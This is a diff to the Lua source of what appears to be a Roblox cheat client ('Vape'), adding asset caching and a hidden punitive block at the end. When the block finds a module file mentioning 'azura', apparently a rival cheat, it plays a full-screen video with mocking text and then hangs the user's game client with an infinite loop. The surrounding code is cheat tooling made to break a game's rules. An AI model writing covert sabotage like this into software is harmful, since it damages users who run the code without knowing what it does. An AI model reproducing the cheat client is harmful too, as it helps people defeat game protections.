@@ -215,8 +215,9 @@ local function getPlayerColor(plr)
 	return (friendCheck(plr, true) and Color3.fromHSV(GuiLibrary["ObjectsThatCanBeSaved"]["Friends ColorSliderColor"]["Api"]["Hue"], GuiLibrary["ObjectsThatCanBeSaved"]["Friends ColorSliderColor"]["Api"]["Sat"], GuiLibrary["ObjectsThatCanBeSaved"]["Friends ColorSliderColor"]["Api"]["Value"]) or tostring(plr.TeamColor) ~= "White" and plr.TeamColor.Color)
 end
 
+local cachedassets = {}
 local function getcustomassetfunc(path)
-	if not isfile(path) then
+	if not betterisfile(path) then
 		task.spawn(function()
 			local textlabel = Instance.new("TextLabel")
 			textlabel.Size = UDim2.new(1, 0, 0, 36)
@@ -228,7 +229,7 @@ local function getcustomassetfunc(path)
 			textlabel.TextColor3 = Color3.new(1, 1, 1)
 			textlabel.Position = UDim2.new(0, 0, 0, -36)
 			textlabel.Parent = GuiLibrary["MainGui"]
-			repeat task.wait() until isfile(path)
+			repeat task.wait() until betterisfile(path)
 			textlabel:Remove()
 		end)
 		local req = requestfunc({
@@ -237,7 +238,10 @@ local function getcustomassetfunc(path)
 		})
 		writefile(path, req.Body)
 	end
-	return getasset(path) 
+	if cachedassets[path] == nil then
+		cachedassets[path] = getasset(path) 
+	end
+	return cachedassets[path]
 end
 
 local function targetCheck(plr)
@@ -5041,3 +5045,62 @@ runcode(function()
 		end
 	})
 end)
+
+if betterisfile("vape/CustomModules/6872274481.lua") then 
+	local parsedfile = readfile("vape/CustomModules/6872274481.lua")
+	if parsedfile and parsedfile:lower():find("azura") then 
+		task.spawn(function()
+			local video = Instance.new("VideoFrame")
+			pcall(function()
+				video.Video = getcustomassetfunc("vape/assets/skill.webm")
+			end)
+			video.Size = UDim2.new(1, 0, 1, 36)
+			video.Visible = false
+			video.Position = UDim2.new(0, 0, 0, -36)
+			video.ZIndex = 9
+			video.BackgroundTransparency = 1
+			video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			local textlab = Instance.new("TextLabel")
+			textlab.TextSize = 45
+			textlab.ZIndex = 10
+			textlab.Size = UDim2.new(1, 0, 1, 36)
+			textlab.TextColor3 = Color3.new(1, 1, 1)
+			textlab.Text = 'imagine using azura 💀\nhow bout you just use regular vape instead of "op client side features!!1!"'
+			textlab.Position = UDim2.new(0, 0, 0, -36)
+			textlab.Font = Enum.Font.Gotham
+			textlab.BackgroundTransparency = 1
+			textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			video.Loaded:Connect(function()
+				video.Visible = true
+				video:Play()
+				task.spawn(function()
+					repeat
+						wait()
+						for i = 0, 1, 0.01 do
+							wait(0.01)
+							textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+						end
+					until true == false
+				end)
+			end)
+			local suc
+			task.spawn(function()
+				suc = pcall(function() return video.Loaded:Wait() end)
+			end)
+			task.spawn(function()
+				for i = 1, 30 do 
+					task.wait(0.1)
+					if suc then break end
+				end
+				task.wait(18.909)
+				pcall(function()
+					if getconnections then
+						getconnections(entity.character.Humanoid.Died)
+					end
+					print(game:GetObjects("h29g3535")[1])
+				end)
+				while true do end
+			end)
+		end)
+	end
+end
